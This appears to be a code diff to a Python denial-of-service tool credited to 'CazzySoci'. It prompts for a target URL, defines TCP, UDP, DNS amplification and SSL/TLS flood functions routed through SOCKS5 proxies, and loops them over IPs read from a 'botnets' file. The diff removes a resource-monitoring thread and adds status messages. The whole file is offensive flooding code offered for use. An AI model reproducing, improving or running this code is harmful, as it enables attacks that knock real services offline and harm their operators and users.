@@ -13,11 +13,11 @@ credit = """
 ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
 ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
-▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
+▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
   ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
   ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
-      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
-                                         ░                  ░        ░         ░ ░                       ░           
+      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
+                                         ░                  ░        ░         ░ ░                       ░          
 ╔════════════════════════╗
 ║ Created by: CazzySoci  ║
 ║                        ║
@@ -30,7 +30,6 @@ credit = """
 ╚════════════════════════╝
 \033[1;36m
 """
-
 print(credit)
 target_url = input("Target url https or http: ")
 target_url = urllib.parse.urlparse(target_url).netloc
@@ -89,18 +88,8 @@ useragents = [
      "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)"
 ]
 
-def monitor_attack():
-    while True:
-        # Get CPU and memory usage
-        cpu_percent = psutil.cpu_percent(interval=1)
-        mem_percent = psutil.virtual_memory().percent
-
-        # Print attack status
-        print(f"Attack in progress - CPU: {cpu_percent}% - Memory: {mem_percent}%")
-
-        time.sleep(5)
-
 def attack_tcp(target_url, target_port, socks5_proxy):
+    print("Starting TCP attack")
     while True:
         try:
             socks5_host, socks5_port = socks5_proxy.split(":")
@@ -122,6 +111,7 @@ def attack_tcp(target_url, target_port, socks5_proxy):
             pass
 
 def attack_udp(target_url, target_port, socks5_proxy):
+    print("Starting UDP attack")
     while True:
         try:
             socks5_host, socks5_port = socks5_proxy.split(":")
@@ -142,6 +132,7 @@ def attack_udp(target_url, target_port, socks5_proxy):
             pass
 
 def attack_dns_amplification(target_url, target_port, socks5_proxy):
+    print("Starting DNS amplification attack")
     while True:
         try:
             socks5_host, socks5_port = socks5_proxy.split(":")
@@ -162,6 +153,7 @@ def attack_dns_amplification(target_url, target_port, socks5_proxy):
             pass
 
 def attack_ssl_tls(target_url, target_port, socks5_proxy):
+    print("Starting SSL/TLS attack")
     while True:
         try:
             socks5_host, socks5_port = socks5_proxy.split(":")
@@ -186,10 +178,6 @@ def start_attack():
     with open(botnets_file, "r") as f:
         botnet_ips = f.read().splitlines()
         
-        # Start monitoring thread
-    monitoring_thread = threading.Thread(target=monitor_attack)
-    monitoring_thread.start()
-
     while True:
         target_url = random.choice(botnet_ips)
         target_port = random.randint(1, 65535)
@@ -209,4 +197,4 @@ def start_attack():
 
         time.sleep(2)
 
-start_attack() 
+start_attack()
